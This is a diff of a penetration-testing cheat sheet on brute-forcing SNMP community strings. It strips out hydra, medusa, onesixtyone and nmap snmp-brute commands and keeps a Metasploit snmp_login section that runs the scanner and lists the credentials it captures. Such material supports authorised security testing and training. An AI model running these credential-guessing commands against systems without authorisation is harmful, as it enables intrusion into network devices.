@@ -1,20 +1,4 @@
-# SNMP
-
-## 01 - Hydra
-
-`$ hydra -U snmp`
-
-`$ hydra -P passwords.lst <IP> snmp`
-
-## 02 - Medusa
-
-`$ medusa -M snmp -h <IP> -u <username> -P passwords.lst`
-
-## 03 - OneSixtyOne
-
-`$ onesixtyone <IP> -c passwords.lst`
-
-## 04 - Metasploit
+# Metasploit
 
 ```
 msf > use auxiliary/scanner/snmp/snmp_login
@@ -51,12 +35,3 @@ msf auxiliary(scanner/snmp/snmp_login) > run -j
 
 msf auxiliary(scanner/snmp/snmp_login) > creds
 ```
-
-## 05 - Nmap
-
-`$ sudo nmap -sU -p 161 -n --script snmp-brute --script-args snmp-brute.communitiesdb=passwords.txt <IP>`
-
----
-## References
-
-- [Password Cracking SNMP](https://www.hackingarticles.in/password-crackingsnmp/)
